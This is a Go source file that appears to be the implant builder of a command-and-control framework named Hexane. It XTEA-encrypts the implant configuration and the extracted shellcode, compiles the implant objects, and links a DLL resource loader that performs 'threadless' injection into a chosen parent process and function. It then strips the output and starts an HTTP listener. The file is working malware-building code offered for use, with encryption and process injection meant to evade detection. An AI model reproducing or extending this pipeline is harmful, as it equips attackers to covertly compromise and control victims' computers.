package main

import (
	"bufio"
	"bytes"
	"debug/pe"
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"time"
)

func GetLoaderComponents(h *HexaneConfig) []string {

	return []string{
		LoaderDll,
		h.Compiler.BuildDirectory + "loader.asm.o",
		h.Compiler.BuildDirectory + "resource.res",
		h.Compiler.BuildDirectory + "loaders.cpp.o",
	}
}

func (h *HexaneConfig) Run() error {
	var err error
	if err = h.BuildUpdate(); err != nil {
		return err
	}

	go h.HttpServerHandler()
	time.Sleep(time.Millisecond * 500)

	return err
}

func (h *HexaneConfig) CreateIncludes(incs []string) string {
	var list string
	for _, inc := range incs {
		list += fmt.Sprintf(" -I%s ", inc)
	}
	return list
}

func (h *HexaneConfig) CreateArguments(args []string) string {
	var (
		list string
	)

	for _, arg := range args {
		list += fmt.Sprintf(" %s ", arg)
	}
	return list
}

func (h *HexaneConfig) CreateDefinitions(defs map[string][]byte) string {
	var list string
	var comms = h.Implant.ProfileTypeId

	if comms == TRANSPORT_HTTP {
		list += " -DTRANSPORT_HTTP "
	} else if comms == TRANSPORT_PIPE {
		list += " -DTRANSPORT_PIPE "
	}

	for name, def := range defs {
		if name == "DEBUG" {

			if h.Compiler.Debug {
				list += fmt.Sprintf(" -D%s ", name)

			} else {
				continue
			}
		} else {
			arr := CreateCppArray(def, len(def))
			list += fmt.Sprintf(" -D%s=%s ", name, arr)
		}
	}
	return list
}

func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, definitions map[string][]byte, output string) error {
	var Command string
	var err error

	Command += command

	if targets != nil {
		Command += h.CreateArguments(targets)
	}

	if definitions != nil {
		Command += h.CreateDefinitions(definitions)
	}

	if includes != nil {
		Command += h.CreateIncludes(includes)
	}

	if flags != nil {
		Command += h.CreateArguments(flags)
	}

	Command += fmt.Sprintf(" -o %s ", output)

	if err = h.RunCommand(Command, PayloadPath); err != nil {
		return err
	}
	return nil
}

func GenerateHashes() error {
	var (
		err      error
		hashFile *os.File
		strFile  *os.File
	)

	WrapMessage("DBG", "generating hashes")
	if strFile, err = os.Open(StringsFile); err != nil {
		return err
	}

	defer strFile.Close()

	if hashFile, err = os.Create(HashHeader); err != nil {
		return err
	}

	scanner := bufio.NewScanner(strFile)
	writer := bufio.NewWriter(hashFile)
	names := make([]string, 0)

	for scanner.Scan() {
		line := scanner.Text()
		names = append(names, line)
	}

	hashes := make([]string, 0)
	for _, str := range names {
		hashes = append(hashes, GetHashFromString(str))
	}

	for _, hash := range hashes {
		if _, err = writer.WriteString(hash + "\n"); err != nil {
			return err
		}
	}

	if err = writer.Flush(); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) GenerateConfig() error {
	var (
		Patch []byte
		Xtea  []byte
		err   error
	)

	WrapMessage("DBG", "generating new implant config")

	h.Key = nil
	h.Key = SeCreateKey(16)

	if Patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	if Xtea, err = CryptXtea(Patch, h.Key, true); err != nil {
		return err
	}

	h.Config = Xtea
	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	var (
		err          error
		InjectMethod string
		InjectConfig map[string][]byte
	)

	if h.Implant.Injection.Threadless != nil {
		InjectMethod = h.Implant.Injection.Threadless.LdrExecute

		InjectConfig = map[string][]byte{
			"OBF_KEY": h.Key,
			"PARENT":  []byte(h.Implant.Injection.Threadless.ProcName),
			"MODULE":  []byte(h.Implant.Injection.Threadless.ModuleName),
			"FUNC":    []byte(h.Implant.Injection.Threadless.FuncName),
		}
	}

	WrapMessage("DBG", "generating resource loader")
	Resource := h.Compiler.BuildDirectory + "resource.res"
	RsrcFile := "\\\"" + h.Compiler.BuildDirectory + "shellcode.bin" + "\\\""

	if err = h.RunCommand(h.Compiler.RsrcCompiler+fmt.Sprintf(" -O coff %s -DBUILDPATH=\"%s\" -o %s", RsrcScript, RsrcFile, Resource), "."); err != nil {
		return err
	}

	Loader := h.Compiler.BuildDirectory + "loader.bin"
	LoaderObject := h.Compiler.BuildDirectory + "loader.asm.o"

	if err = h.RunCommand(h.Compiler.Objcopy+fmt.Sprintf(" -j .text -O binary %s %s", LoaderObject, Loader), "."); err == nil {
		if InjectConfig["LOADER"], err = os.ReadFile(Loader); err != nil {
			return err
		}
	} else {
		return err
	}

	InjectObject := h.Compiler.BuildDirectory + filepath.Base(InjectMethod) + ".o"
	LoaderComponents := GetLoaderComponents(h)
	LoaderComponents = append(LoaderComponents, InjectObject)

	WrapMessage("INF", fmt.Sprintf("generating object file for %s", InjectMethod))
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectMethod}, nil, h.Compiler.IncludeDirs, nil, InjectObject); err != nil {
		return err
	}

	LoaderObjects := h.Compiler.BuildDirectory + "loaders.cpp.o"
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{LoadersCpp, InjectObject}, nil, h.Compiler.IncludeDirs, InjectConfig, LoaderObjects); err != nil {
		return err
	}

	RsrcLoader := h.Compiler.BuildDirectory + h.ImplantName + h.Compiler.FileExtension

	WrapMessage("INF", "generating dll rsrc loader")
	if err = h.CompileObject(h.Compiler.Mingw, LoaderComponents, []string{"-shared"}, h.Compiler.IncludeDirs, InjectConfig, RsrcLoader); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		if err = h.RunCommand(h.Compiler.Strip+" "+RsrcLoader, cwd); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) GenerateShellcode() error {
	var (
		data   *os.File
		peFile *pe.File
		text   *pe.Section
		err    error
	)

	WrapMessage("INF", "generating shellcode")
	if data, err = os.Open(h.Compiler.BuildDirectory + "interm.exe"); err != nil {
		return err
	}
	defer data.Close()

	if peFile, err = pe.NewFile(data); err != nil {
		return err
	}

	for _, section := range peFile.Sections {
		if section.Name == ".text" {
			text = section
			break
		}
	}

	if text == nil {
		return fmt.Errorf(" .text section was not found")
	}

	Shellcode := h.Compiler.BuildDirectory + "shellcode.bin"
	outData := make([]byte, text.Size)

	if _, err = data.ReadAt(outData, int64(text.Offset)); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		WrapMessage("INF", "encrypting shellcode with XTEA")

		h.Key = SeCreateKey(16)
		if outData, err = CryptXtea(outData, h.Key, true); err != nil {
			return err
		}
	}

	if err = WriteFile(Shellcode, outData); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) GenerateObjects() error {
	var (
		files []os.DirEntry
		dir   string
		err   error
	)

	WrapMessage("DBG", "generating core object files")

	RequiredMods["CONFIG_BYTES"] = h.Config
	RequiredMods["OBF_KEY"] = h.Key

	if h.Compiler.Debug {
		RequiredMods["DEBUG"] = nil
	}

	for _, dir = range h.Compiler.ComponentDirs {
		if files, err = os.ReadDir(dir); err != nil {
			return err
		}

		for _, file := range files {
			if file.Name() == ".idea" {
				continue
			}

			FilePath := fmt.Sprintf("%s/%s ", dir, file.Name())
			ObjFile := fmt.Sprintf(" %s/%s.o ", h.Compiler.BuildDirectory, file.Name())

			if path.Ext(file.Name()) == ".cpp" {
				if err = h.CompileObject(fmt.Sprintf("%s -c", h.Compiler.Mingw), []string{FilePath}, h.Compiler.Flags, h.Compiler.IncludeDirs, RequiredMods, ObjFile); err != nil {
					return err
				}
			} else if path.Ext(file.Name()) == ".asm" {
				if err = h.CompileObject(fmt.Sprintf("%s -f win64", h.Compiler.Assembler), []string{FilePath}, nil, nil, nil, ObjFile); err != nil {
					return err
				}
			} else {
				continue
			}

			h.Components = append(h.Components, ObjFile)
		}
	}

	Intermediate := h.Compiler.BuildDirectory + "interm.exe"
	if err = h.CompileObject(fmt.Sprintf("%s -T %s", h.Compiler.Linker, Ld), h.Components, nil, h.Compiler.IncludeDirs, nil, Intermediate); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) RunCommand(cmd, cwd string) error {
	var (
		Stdout, Stderr bytes.Buffer
		Command        *exec.Cmd
		err            error
	)

	Command = exec.Command("cmd.exe", "/c", cmd)
	Command.Stdout = &Stdout
	Command.Stderr = &Stderr
	Command.Dir = cwd

	errLog := fmt.Sprintf("..\\logs\\%s-build.error.log", strconv.Itoa(int(h.Implant.PeerId)))

	if err = Command.Run(); err != nil {
		if err = os.MkdirAll(Logs, os.ModePerm); err != nil {
			return err
		}

		if err = WriteFile(errLog, Stdout.Bytes()); err != nil {
			return err
		}
		if err = WriteFile(errLog, Stderr.Bytes()); err != nil {
			return err
		}

		return fmt.Errorf("compilation error. Check %s for details", errLog)
	}

	return nil
}

func (h *HexaneConfig) BuildUpdate() error {
	var (
		err error
	)

	WrapMessage("INF", "starting build...")

	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	if err = h.GenerateConfig(); err != nil {
		return err
	}

	if err = GenerateHashes(); err != nil {
		return err
	}

	if err = h.GenerateObjects(); err != nil {
		return err
	}

	if err = h.GenerateShellcode(); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		if err = h.GenerateLoader(); err != nil {
			return err
		}
	} else if h.BuildType == "exe" {

		h.Components = []string{h.Compiler.BuildDirectory + "interm.exe"}
		h.Components = append(h.Components, MainExe)

		WrapMessage("INF", "generating exe")
		if err = h.CompileObject(h.Compiler.Mingw, h.Components, nil, h.Compiler.IncludeDirs, nil, "C:\\Users\\lemur\\Desktop\\main.exe"); err != nil {
			return err
		}

		if !h.Compiler.Debug {
			if err = h.RunCommand(h.Compiler.Strip+" C:\\Users\\lemur\\Desktop\\main.exe", cwd); err != nil {
				return err
			}
		}
	}

	AddConfig(h)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
